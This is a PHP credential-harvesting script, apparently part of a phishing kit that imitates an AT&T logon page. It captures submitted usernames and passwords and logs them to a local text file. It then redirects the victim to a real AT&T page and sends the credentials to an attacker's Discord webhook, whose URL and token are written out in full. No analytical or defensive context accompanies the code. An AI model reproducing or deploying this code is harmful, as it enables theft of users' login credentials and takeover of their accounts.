<?php

extract($_REQUEST);
$file=fopen("loggerbystimp.txt","a");

$timestamp = date("c", strtotime("now"));

fwrite($file,"USERNAME==");
fwrite($file, $USERNAME ."\n");
fwrite($file,"PASSWORD==");
fwrite($file, $PASSWORD ." | ");
fwrite($file, $timestamp ."\n");

fwrite($file, "--------------------\n");
    
fclose($file);
header("location: https://opus.att.net/opus/spring/security/findhome?cc=");


$webhookurl = "https://discord.com/api/webhooks/1029886595047890955/8KvLwaC6wqoC3cBNXyaJYDqWWVNeQM3ceW7FBuMEkSkphKsRdK3pi7Oa9RBh8aziJcnr";

$json_data = json_encode([
    // Message
    "content" => "",
    
    // Username
    "username" => ".",

    // Avatar URL.
    // Uncoment to replace image set in webhook
    //"avatar_url" => "https://ru.gravatar.com/userimage/28503754/1168e2bddca84fec2a63addb348c571d.jpg?size=512",

    // Text-to-speech
    "tts" => false,

    // File upload
    // "file" => "",

    // Embeds Array
    "embeds" => [
        [
            // Embed Title
            "title" => "",

            // Embed Type
            "type" => "rich",



            // URL of title link
            "url" => "",

            // Timestamp of embed must be formatted as ISO8601
            "timestamp" => $timestamp,

            // Embed left border color in HEX
            "color" => hexdec( "03a1fc" ),

            // Footer
            "footer" => [
                "text" => "global logon",
                "icon_url" => "https://cdn.discordapp.com/attachments/920789056625971210/933790629740306542/attlogo.png"
            ],

            // Author
            "author" => [
                "name" => "/lrr/attLRR/",
                "url" => "http://188.212.124.214/lrr/attLRR/"
            ],

            // Additional Fields array
            "fields" => [
                // Field 1
                [
                    "name" => "USERNAME",
                    "value" => $USERNAME,
                    "inline" => false
                ],
                // Field 2
                [
                    "name" => "PASSWORD",
                    "value" => $PASSWORD,
                    "inline" => true
                ]
                // Etc..
            ]
        ]
    ]

], JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE );


$ch = curl_init( $webhookurl );
curl_setopt( $ch, CURLOPT_HTTPHEADER, array('Content-type: application/json'));
curl_setopt( $ch, CURLOPT_POST, 1);
curl_setopt( $ch, CURLOPT_POSTFIELDS, $json_data);
curl_setopt( $ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt( $ch, CURLOPT_HEADER, 0);
curl_setopt( $ch, CURLOPT_RETURNTRANSFER, 1);

$response = curl_exec( $ch );

curl_close( $ch );

 ?>
